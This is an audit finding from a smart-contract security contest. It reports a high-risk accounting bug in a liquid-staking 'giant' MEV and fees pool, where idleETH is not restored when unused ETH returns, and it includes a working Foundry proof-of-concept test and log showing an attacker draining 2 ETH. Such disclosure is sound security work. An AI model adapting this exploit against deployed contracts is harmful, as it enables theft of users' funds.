## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-10

# [GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function loses the addition of the idleETH which allows attackers to steal most of eth from the Giant Pool](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/173) 

# Lines of code

https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138
https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178


# Vulnerability details

## Impact
The contract GiantMevAndFeesPool override the function totalRewardsReceived:
```
return address(this).balance + totalClaimed - idleETH;
```
The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP`
```
uint256 received = totalRewardsReceived();
uint256 unprocessed = received - totalETHSeen;
```

The idleETH will be decreased in the function `batchDepositETHForStaking` for sending eth to the staking pool. But the idleETH wont be increased in the function `bringUnusedETHBackIntoGiantPool` which is used to burn lp tokens in the staking pool, and the staking pool will send the eth back to the giant pool. And then because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.

## Proof of Concept
test:
test/foundry/TakeFromGiantPools.t.sol
```
pragma solidity ^0.8.13;

// SPDX-License-Identifier: MIT

import "forge-std/console.sol";
import {GiantPoolTests} from "./GiantPools.t.sol";
import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";

contract TakeFromGiantPools is GiantPoolTests {
    function testDWclaimRewards() public{
        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);
        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);
        address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);

        // Register BLS key
        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);

        // Deposit ETH into giant fees and mev
        vm.startPrank(feesAndMevUserOne);
        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);
        vm.stopPrank();
        vm.startPrank(feesAndMevUserTwo);
        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);

        bytes[][] memory blsKeysForVaults = new bytes[][](1);
        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);

        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);
        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);
        giantFeesAndMevPool.batchDepositETHForStaking(
            getAddressArrayFromValues(address(manager.stakingFundsVault())),
            getUint256ArrayFromValues(4 ether),
            blsKeysForVaults,
            stakeAmountsForVaults
        );
        vm.warp(block.timestamp+31 minutes);
        LPToken[] memory tokens = new LPToken[](1);
        tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);

        LPToken[][] memory allTokens = new LPToken[][](1);
        allTokens[0] = tokens;
        giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(
            getAddressArrayFromValues(address(manager.stakingFundsVault())),
            allTokens,
            stakeAmountsForVaults
        );
        // inject a NOOP to skip some functions
        address[] memory stakingFundsVaults = new address[](1);
        bytes memory code = new bytes(1);
        code[0] = 0x00;
        vm.etch(address(0x123), code);
        stakingFundsVaults[0] = address(0x123);
        giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);
        vm.stopPrank();
        console.log("user one:", getBalance(feesAndMevUserOne));
        console.log("user two(attacker):", getBalance(feesAndMevUserTwo));
        console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));
    }

    function getBalance(address addr) internal returns (uint){
        // giant LP : eth at ratio of 1:1
        return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);
    }

}
```

run test:
```
forge test --match-test testDWclaimRewards -vvv
```

test log:
```
Logs:
  user one: 4000000000000000000
  user two(attacker): 6000000000000000000
  giantFeesAndMevPool: 6000000000000000000
```
The attacker stole 2 eth from the pool.

## Tools Used
fodunry

## Recommended Mitigation Steps
Add 
```
idleETH += _amounts[i];
```
before burnLPTokensForETH in the GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function.